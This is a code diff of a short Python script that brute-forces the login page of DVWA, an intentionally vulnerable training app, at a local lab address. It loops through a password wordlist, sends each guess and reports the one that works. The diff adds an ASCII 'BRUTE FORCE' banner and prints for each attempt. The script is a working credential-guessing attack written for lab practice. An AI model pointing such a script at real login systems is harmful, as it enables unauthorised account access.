@@ -1,8 +1,22 @@
-import requests
+print (""" 
 
+██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
+                                                                            
+                        ALEN
+        https://github.com/allensec01/tools-python
+
+
+""")
+import requests
+            
 url = "http://192.168.254.129/DVWA/vulnerabilities/brute/"
 with open("pasword.txt") as file:
     password_lst = [line.strip() for line in file]
+
 
 #print(password_str)
 for password in password_lst:
@@ -12,4 +26,8 @@ for password in password_lst:
     txt = req.text
     #print(txt)
     if "Welcome" in txt:
-        print("You win *** password is : ",password)
+        print("YOU ARE WINNING  **** password is : ",password)
+        break
+    else: 
+        print("YOU ARE Failing  **** password is : ",password)
+        
